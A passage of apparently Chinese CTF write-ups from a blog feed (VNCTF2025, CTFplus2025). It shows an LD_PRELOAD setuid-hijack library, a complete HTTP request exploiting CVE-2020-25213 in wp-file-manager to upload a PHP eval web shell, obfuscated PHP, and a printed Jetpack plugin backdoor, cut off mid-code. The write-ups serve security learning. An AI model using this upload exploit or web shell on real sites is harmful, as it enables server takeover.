aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208205327639.png" alt="image-20250208205327639"></p><p>？</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208210120521.png" alt="image-20250208210120521"></p><p>🤔</p><p>看一下进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 /bin/bash /root/start.shmysql       <span class="token number">41</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 /bin/sh /usr/bin/mysqld_safemysql      <span class="token number">188</span>    <span class="token number">41</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:02 /usr/sbin/mysqld <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/var/lib/mysql --plugin-dir<span class="token operator">=</span>/usr/lib/mysql/plugin --log-error<span class="token operator">=</span>/var/log/mysql/error.log --pid-file<span class="token operator">=</span>ret2shell-47-1447.pidroot       <span class="token number">273</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 <span class="token function">sudo</span> <span class="token parameter variable">-u</span> ctfer <span class="token parameter variable">-i</span>ctfer      <span class="token number">274</span>   <span class="token number">273</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 <span class="token parameter variable">-bash</span>ctfer      <span class="token number">276</span>   <span class="token number">274</span>  <span class="token number">0</span> <span class="token number">13</span>:07 ?        00:00:00 ./GinTestctfer     <span class="token number">2739</span>   <span class="token number">276</span>  <span class="token number">8</span> <span class="token number">13</span>:12 ?        00:00:00 go run /tmp/goeval-2979922160.goctfer     <span class="token number">2906</span>  <span class="token number">2739</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 /tmp/go-build1797982035/b001/exe/goeval-2979922160ctfer     <span class="token number">2911</span>  <span class="token number">2906</span> <span class="token number">23</span> <span class="token number">13</span>:12 ?        00:00:00 go run /tmp/cremquog/main.goctfer     <span class="token number">3094</span>  <span class="token number">2911</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 /tmp/go-build898556976/b001/exe/mainctfer     <span class="token number">3099</span>  <span class="token number">3094</span>  <span class="token number">0</span> <span class="token number">13</span>:12 ?        00:00:00 <span class="token function">ps</span> <span class="token parameter variable">-ef</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有需要注意的</p><p>想了一下，可能需要劫持命令，准备so文件</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span>\"<span class="token operator">/</span>bin<span class="token operator">/</span>sh\"<span class="token punctuation">,</span>\"<span class="token operator">-</span>c\"<span class="token punctuation">,</span>\"export LD_PRELOAD<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>evil<span class="token punctuation">.</span>so<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">...</span><span class="token operator">/</span>Cat<span class="token punctuation">;</span>id\"<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>失败</p><p>参考：<a href="https://pankas.top/2022/12/12/rctf-web/#%E7%A4%BA%E4%BE%8B">https://pankas.top/2022/12/12/rctf-web/#%E7%A4%BA%E4%BE%8B</a></p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208233641216.png" alt="image-20250208233641216"></p><p>结合ida反编译的结果，考虑劫持setuid</p><p>hook.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">setuid</span><span class="token punctuation">(</span>__uid_t __uid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250209000601002.png" alt="image-20250209000601002"></p><p>本地通了远程没通。。。</p><hr><h2 id="ez-emlog（Unsolved）"><a href="#ez-emlog（Unsolved）" class="headerlink" title="ez_emlog（Unsolved）"></a>ez_emlog（Unsolved）</h2><blockquote><p>install.php<br>mt_rand的安全问题</p></blockquote><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h2><p>给了个rust写的程序和源代码</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 渲染文本</span><span class="token comment">// Fake Flag lol</span><span class="token keyword">let</span> text1 <span class="token operator">=</span> <span class="token string">"VNCTF&#123;VNCTF"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text2 <span class="token operator">=</span> <span class="token string">"VNCTFVNCTF"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text3 <span class="token operator">=</span> <span class="token string">"CTFVNCTFVN"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text4 <span class="token operator">=</span> <span class="token string">"VNFTCVNFTC"</span><span class="token punctuation">;</span><span class="token keyword">let</span> text5 <span class="token operator">=</span> <span class="token string">"CTFVNCTFVN&#125;"</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span> <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要知道这里的flag是明文存储在程序就行</p><p>ida shift+f12 秒了</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208110202323.png" alt="image-20250208110202323"></p><p><code>VNCTF&#123;byRXtpYEF6j8bFCQ7Nf7tZ8EDWcG8Xl4kKXds1pOTF1dV&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;完 全 败 北&lt;/p&gt;
&lt;p&gt;去年是遗憾，今年是惨败&lt;/p&gt;
&lt;p&gt;第三年了，本以为今年能打出一个比较满意的成绩，结果web直接爆零了&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFplus2025新春挑战赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2025-01-28T12:07:30.000Z</published>
    <updated>2025-01-31T08:15:21.674Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>除夕打ctf ver3</p><p>二进制的部分不会啦 _(:3 」∠ )_</p><span id="more"></span><hr><h1 id="入侵分析"><a href="#入侵分析" class="headerlink" title="入侵分析"></a>入侵分析</h1><p>wpscan 加 –force 参数开扫</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> robots.txt found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/robots.txt <span class="token operator">|</span> Interesting Entry: /3ysd8.html <span class="token operator">|</span> Found By: Robots Txt <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress readme found: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/readme.html <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Upload directory has listing enabled: http://80-f50c110e-2ade-4954-82e6-bc11c1f14bba.challenge.ctfplus.cn/wp-content/uploads/ <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%Fingerprinting the version - Time: 00:00:57 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">702</span> / <span class="token number">702</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:57<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The WordPress version could not be detected.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span> Checking Config Backups - Time: 00:00:01 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">137</span> / <span class="token number">137</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:01<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK <span class="token operator">|</span> Plan: <span class="token function">free</span> <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">0</span> <span class="token operator">|</span> Requests Remaining: <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3ysd8.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>备忘录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>怕忘了，放这儿，应该没人知道吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- key是  app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;wp-content&#x2F;uploads&#x2F;2025&#x2F;01&#x2F; 下下载到源码</p><p>只发现一个 wpfilemanager.php 比较令人在意，搜一下，有 CVE-2020-25213</p><p>flag：<code>flag&#123;CVE-2020-25213_wp-file-manager&#125;</code></p><p>传马</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">80-c1f4bf17-2a3c-4b73-a278-0c963f55036f.challenge.ctfplus.cn</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=72489tgmnn16aeuar248kim1g8</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">415</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundarySkJwlzCQ52IPd8V5</span></span>------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="cmd"</span></span>upload------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data;name="target"</span></span>l1_------WebKitFormBoundarySkJwlzCQ52IPd8V5<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="upload[]";filename="shell.php"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>&lt;?php @eval($_POST[1]);?>------WebKitFormBoundarySkJwlzCQ52IPd8V5--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128203719059.png" alt="image-20250128203719059"></p><hr><h1 id="reverse-加密迷局（Unsolved）"><a href="#reverse-加密迷局（Unsolved）" class="headerlink" title="reverse-加密迷局（Unsolved）"></a>reverse-加密迷局（Unsolved）</h1><p>蚁剑连上去</p><p>发现同目录下config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">rfHWEMTbes0uuYuHJczUCsS2ovroJHKWpYLixdKXtfqPqKWJudyRhqPatqjbjXX1raKshzfaivabqDzicra4yurenZqLgBvqcrqWfKPmu1uUfXaJqKGzDrafvKS4iqHaj0WerGKPfXfgdziEdveByvmUnYjchNXnrHC8aBznxGjEus8Olav8sZq2BBmPvXvwczfgs09wFfzrJGChDfnsuBavBauvqgfqDsOhBXBtwHGQiZqtiKBNpImYftvJga5na0WCfdKNhXngwIzPdDuxaL9sJdKIoxzFDG8ruvfvtXvvoLeDoLjQqtPtrqK2q0ztofvqqtPuAIXtvuCTxurlFLrqvYXwvw0SvLuolv1Ds35ruB4SvfCKlfeurY1erDT<span class="token operator">+</span>uvDElarxjcXvvDCTx0nlFLerhIXtvIqSu1yolv1ds35grGKyBqv8skCKnqKkv0f4paBuhuypJB8BqD1BaI8twDqjDH8BqgyDvriyiuPmphy3nYLqcrqZf0yevKOoJd1HB0yjBaKhFaTgsvrcxa8Mf1BxoKnquqBfuLDQrf5gjHvshkPsrL1HuD9wvL1Av1WvlHCqcKjilGqvaGmcqLCCs0rCuB8VJZ1qxrKvfIG0wK0qcqfqxfa0Ja8AvKTEotnMpuWeBfusmIBgdziEdveBc0Wru0D6vMLBoLBclqXBaN5su1CSvLqafLayJHrCdYyatampfDWAgIq1mtLruuaZEI4drH8sdZTqxrC8aBznxLXDw0yZusGniKjatBmdnGL0rf0DgsCtcLajfBKwsGXAcXmSfzyCrhq6izKpoDOWfuSqBqGfaDa<span class="token operator">/</span>gqOcazfJtBrYBZipvDydnrzDfqWrDvCyrcWxaLavDZ0CBuBmJBS<span class="token operator">+</span>i1TDxvaMDq0zuaKugrWJtfmJjIaKqsjaJXuiqDTrotfmvcLcrKOvuqzwmuBnJBS<span class="token operator">+</span>i1TDcriFauBNwvWiDr8dazHnfamulXqplGidqDz8DIukCDreJzG0oq5qcrqWfKP9e1imfLLm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>enc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">goto</span> gocnm<span class="token punctuation">;</span>pyr9U<span class="token punctuation">:</span><span class="token variable">$AeU4Z</span> <span class="token operator">=</span> <span class="token function">wxrm5</span><span class="token punctuation">(</span><span class="token variable">$ovA2n</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> ZXC1s<span class="token punctuation">;</span>bRFpO<span class="token punctuation">:</span><span class="token variable">$kqXHn</span> <span class="token operator">=</span> <span class="token function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$G3spL</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> tDl1K<span class="token punctuation">;</span>mPUF3<span class="token punctuation">:</span><span class="token variable">$G3spL</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> bRFpO<span class="token punctuation">;</span>gocnm<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token function-definition function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">,</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">goto</span> Te0pD<span class="token punctuation">;</span>    U_h6_<span class="token punctuation">:</span>    <span class="token keyword">goto</span> jAnQc<span class="token punctuation">;</span>    <span class="token keyword">goto</span> EUfZj<span class="token punctuation">;</span>    V51ce<span class="token punctuation">:</span>    rgswz<span class="token punctuation">:</span>    <span class="token keyword">goto</span> J8PqR<span class="token punctuation">;</span>    eOzRo<span class="token punctuation">:</span>    <span class="token variable">$hp_8p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> ZBeFr<span class="token punctuation">;</span>    ZBeFr<span class="token punctuation">:</span>    jAnQc<span class="token punctuation">:</span>    <span class="token keyword">goto</span> ka22G<span class="token punctuation">;</span>    dtEi1<span class="token punctuation">:</span>    <span class="token variable">$pdpKe</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$pcDaC</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span> <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> V51ce<span class="token punctuation">;</span>    MmYXr<span class="token punctuation">:</span>    <span class="token variable">$pcDaC</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> eOzRo<span class="token punctuation">;</span>    QbNa9<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token variable">$pdpKe</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> Ju0hu<span class="token punctuation">;</span>    Te0pD<span class="token punctuation">:</span>    <span class="token variable">$pdpKe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> MmYXr<span class="token punctuation">;</span>    J8PqR<span class="token punctuation">:</span>    <span class="token variable">$hp_8p</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> U_h6_<span class="token punctuation">;</span>    ka22G<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$hp_8p</span> <span class="token operator">&lt;</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">goto</span> fcyLI<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">goto</span> dtEi1<span class="token punctuation">;</span>    EUfZj<span class="token punctuation">:</span>    fcyLI<span class="token punctuation">:</span>    <span class="token keyword">goto</span> QbNa9<span class="token punctuation">;</span>    Ju0hu<span class="token punctuation">:</span><span class="token punctuation">&#125;</span><span class="token keyword">goto</span> mPUF3<span class="token punctuation">;</span>tDl1K<span class="token punctuation">:</span><span class="token variable">$ovA2n</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> pyr9U<span class="token punctuation">;</span>ZXC1s<span class="token punctuation">:</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$kqXHn</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$AeU4Z</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$kqXHn geesecenc</p><p>$AeU4Z config.php</p><p>那么就是执行了<code>geesecenc(config.php)</code></p><p>而 geesecenc 在so文件里</p><hr><h1 id="新年隐患"><a href="#新年隐患" class="headerlink" title="新年隐患"></a>新年隐患</h1><p>找一下可能的后门代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins<span class="token punctuation">)</span> $ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token string">'eval('</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">--include</span><span class="token operator">=</span>*.php <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null./wp-file-manager/lib/files/shell.php:<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>./jetpack/extensions/blocks/ai-chat/ai-response.php:                @eval<span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那就在 &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-content&#x2F;plugins&#x2F;jetpack&#x2F;extensions&#x2F;blocks&#x2F;ai-chat&#x2F;ai-response.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">// AI Chat Module Initialization</span>    <span class="token comment">/* ZmxhZ3tiNGNrZDAwcl9qZXRwYWNrX2FpX2NoYXRfMjAyNH0= */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token keyword">eval</span><span class="token punctuation">(</span><span 